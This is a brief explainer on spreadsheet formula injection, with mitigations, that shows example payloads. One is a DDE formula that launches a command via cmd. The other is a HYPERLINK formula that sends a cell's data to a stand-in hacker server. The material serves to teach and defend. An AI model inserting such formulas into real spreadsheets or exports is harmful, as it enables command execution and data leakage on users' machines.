# Formula injection

## How this works

When user open a spreadsheet (excel, csv etc), the spreadsheet program (excel, openoffice, libreoffice, etc) would try to process formulas (that begin with `=`, `+`, `-` or `@`).

## Example

```excel
=cmd|’ /C notepad’!’A1′ 
```

The DDE (Dynamic Data Exchange) function can execute application command.  
This would open the notepad program whenever user open the spreadsheet

```excel
=HYPERLINK("http://hacker-server?leak="&B2, "a link")
```

The `HYPERLINK` function can create a shortcut to a document in the network.  
This would leak the data in B2 to hacker server whenever user click to the cell.

## Mitigation

* Prohibit cells begin with `=`, `+`, `-`, `*`, `/` or `@`
* Add apostrophe `'` at the beginning of the cell to tell that this is not a formula
